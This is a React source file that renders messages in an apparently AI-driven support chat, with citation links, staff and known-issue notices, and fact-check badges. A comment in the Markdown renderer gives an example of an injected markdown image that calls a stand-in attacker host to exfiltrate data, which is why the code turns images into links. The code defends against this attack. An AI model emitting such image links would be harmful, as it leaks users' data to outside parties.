"use client";

import ReactMarkdown from "react-markdown";
import remarkGfm from "remark-gfm";
import { Activity, CheckCircle2, Headset, Info, Loader2, ShieldCheck, TriangleAlert } from "lucide-react";

import { SentFileChips } from "@/components/attachments";
import type { AttachmentMeta, Citation } from "@/lib/types";
import { cn } from "@/lib/utils";

export type UiMessage =
  | { kind: "customer"; text: string; attachments?: AttachmentMeta[] }
  | {
      kind: "ai";
      text: string;
      citations: Citation[];
      status?: string;
      streaming?: boolean;
      check?: { verdict: string; claims?: number; supported?: number; unsupported?: string[] };
      guarded?: string[];
    }
  | { kind: "staff"; text: string; id: number }
  | { kind: "notice"; text: string; tone: "info" | "success" | "warning" }
  | { kind: "known_issue"; number: string; notice: string };

/** Turn [n] markers into links to the cited doc page. */
function linkCitations(text: string, citations: Citation[]) {
  const byN = new Map(citations.map((c) => [c.n, c]));
  return text.replace(/\[(\d+)\]/g, (match, n) => {
    const c = byN.get(Number(n));
    return c ? `[[${n}]](${c.url} "${c.title.replace(/"/g, "'")}")` : match;
  });
}

/** Cited sources grouped by page, so several passages from one page show as one chip: [1][2] Title. */
function citedSources(text: string, citations: Citation[]) {
  const used = new Set([...text.matchAll(/\[(\d+)\]/g)].map((m) => Number(m[1])));
  const pages = new Map<string, { url: string; title: string; ns: number[] }>();
  for (const c of citations.filter((c) => used.has(c.n))) {
    const page = pages.get(c.url) ?? { url: c.url, title: c.title, ns: [] };
    page.ns.push(c.n);
    pages.set(c.url, page);
  }
  return [...pages.values()];
}

export function Markdown({ text }: { text: string }) {
  return (
    <div className="prose-chat text-sm leading-relaxed [&_ol]:list-decimal [&_ol]:pl-5 [&_ul]:list-disc [&_ul]:pl-5 [&_li]:my-0.5 [&_p]:my-1.5 [&_strong]:font-semibold [&_code]:rounded [&_code]:bg-muted [&_code]:px-1 [&_code]:text-xs">
      <ReactMarkdown
        remarkPlugins={[remarkGfm]}
        components={{
          // never load images: an injected ![x](https://attacker/?d=...) would send data when it loads
          img: ({ src, alt }) => (
            <a href={typeof src === "string" ? src : undefined} target="_blank" rel="noreferrer nofollow"
               className="text-xs text-muted-foreground underline">
              [image{alt ? `: ${alt}` : ""}]
            </a>
          ),
          a: ({ href, title, children }) => (
            <a
              href={href}
              title={title ?? undefined}
              target="_blank"
              rel="noreferrer"
              className="font-medium text-primary underline decoration-dotted underline-offset-2 hover:decoration-solid"
            >
              {children}
            </a>
          ),
        }}
      >
        {text}
      </ReactMarkdown>
    </div>
  );
}

export function ChatMessage({ message }: { message: UiMessage }) {
  if (message.kind === "customer") {
    return (
      <div className="flex flex-col items-end gap-1">
        <div className="max-w-[85%] whitespace-pre-wrap rounded-2xl rounded-br-sm bg-primary px-3.5 py-2 text-sm text-primary-foreground">
          {message.text}
        </div>
        <SentFileChips files={message.attachments ?? []} className="max-w-[85%] justify-end" />
      </div>
    );
  }

  if (message.kind === "known_issue") {
    // the support team's own words, shown verbatim (never rewritten by the assistant)
    return (
      <div className="rounded-xl border border-amber-300 bg-amber-50 p-3 text-sm text-amber-950 dark:border-amber-800 dark:bg-amber-950 dark:text-amber-100">
        <p className="mb-1 flex items-center gap-1.5 text-xs font-semibold">
          <Activity className="size-3.5" /> Known issue · {message.number} · update from our support team
        </p>
        <p className="whitespace-pre-wrap">{message.notice}</p>
      </div>
    );
  }

  if (message.kind === "notice") {
    const Icon = message.tone === "success" ? CheckCircle2 : message.tone === "warning" ? TriangleAlert : Info;
    return (
      <div
        className={cn(
          "mx-auto flex max-w-[90%] items-center gap-2 rounded-lg px-3 py-1.5 text-xs",
          message.tone === "success" && "bg-emerald-50 text-emerald-800 dark:bg-emerald-950 dark:text-emerald-200",
          message.tone === "warning" && "bg-amber-50 text-amber-800 dark:bg-amber-950 dark:text-amber-200",
          message.tone === "info" && "bg-muted text-muted-foreground",
        )}
      >
        <Icon className="size-3.5 shrink-0" />
        <span>{message.text}</span>
      </div>
    );
  }

  if (message.kind === "staff") {
    return (
      <div className="flex gap-2">
        <div className="mt-1 flex size-7 shrink-0 items-center justify-center rounded-full bg-emerald-100 text-emerald-700 dark:bg-emerald-950 dark:text-emerald-300">
          <Headset className="size-4" />
        </div>
        <div className="max-w-[85%]">
          <p className="mb-0.5 text-xs font-medium text-emerald-700 dark:text-emerald-300">Support team</p>
          <div className="rounded-2xl rounded-tl-sm border border-emerald-200 bg-emerald-50 px-3.5 py-2 dark:border-emerald-900 dark:bg-emerald-950/50">
            <Markdown text={message.text} />
          </div>
        </div>
      </div>
    );
  }

  const sources = citedSources(message.text, message.citations);
  return (
    <div className="flex gap-2">
      <div className="mt-1 flex size-7 shrink-0 items-center justify-center rounded-full bg-primary text-[11px] font-semibold text-primary-foreground">
        SP
      </div>
      <div className="min-w-0 max-w-[85%] space-y-1.5">
        {message.status && (
          <p className="flex items-center gap-1.5 text-xs text-muted-foreground">
            <Loader2 className="size-3 animate-spin" /> {message.status}
          </p>
        )}
        {message.text ? (
          <div className="rounded-2xl rounded-tl-sm bg-muted px-3.5 py-2">
            <Markdown text={linkCitations(message.text, message.citations)} />
            {message.streaming && <span className="ml-0.5 inline-block h-3.5 w-1.5 animate-pulse bg-foreground/60" />}
          </div>
        ) : (
          message.streaming &&
          !message.status && (
            <div className="flex gap-1 rounded-2xl bg-muted px-3.5 py-3">
              {[0, 150, 300].map((d) => (
                <span key={d} className="size-1.5 animate-bounce rounded-full bg-foreground/40" style={{ animationDelay: `${d}ms` }} />
              ))}
            </div>
          )
        )}
        {!message.streaming && <TrustNote check={message.check} guarded={message.guarded} />}
        {!message.streaming && sources.length > 0 && (
          <div className="flex flex-wrap gap-1.5 pt-0.5">
            {sources.map((c) => (
              <a
                key={c.url}
                href={c.url}
                target="_blank"
                rel="noreferrer"
                title={c.title}
                className="max-w-full truncate rounded-md border bg-background px-2 py-0.5 text-[11px] text-muted-foreground hover:bg-muted hover:text-foreground"
              >
                {c.ns.map((n) => `[${n}]`).join("")} {c.title}
              </a>
            ))}
          </div>
        )}
      </div>
    </div>
  );
}

/** Result of the self-check and the output guard, under an assistant answer. */
function TrustNote({ check, guarded }: { check?: Extract<UiMessage, { kind: "ai" }>["check"]; guarded?: string[] }) {
  if (guarded?.length)
    return (
      <p className="flex items-center gap-1 text-[11px] text-amber-700 dark:text-amber-400">
        <ShieldCheck className="size-3" /> Part of this answer was removed by a safety check.
      </p>
    );
  if (check?.verdict === "grounded")
    return (
      <p className="flex items-center gap-1 text-[11px] text-emerald-700 dark:text-emerald-400"
         title={`${check.supported} of ${check.claims} statements found in the cited documentation`}>
        <ShieldCheck className="size-3" /> Checked against the docs
      </p>
    );
  if (check?.verdict === "revised") {
    const n = check.unsupported?.length ?? 0;
    return (
      <p className="flex items-center gap-1 text-[11px] text-amber-700 dark:text-amber-400"
         title={check.unsupported?.join("\n")}>
        <ShieldCheck className="size-3" /> Revised after fact-check: removed {n} statement{n === 1 ? "" : "s"} the docs
        don&apos;t support
      </p>
    );
  }
  return null;
}
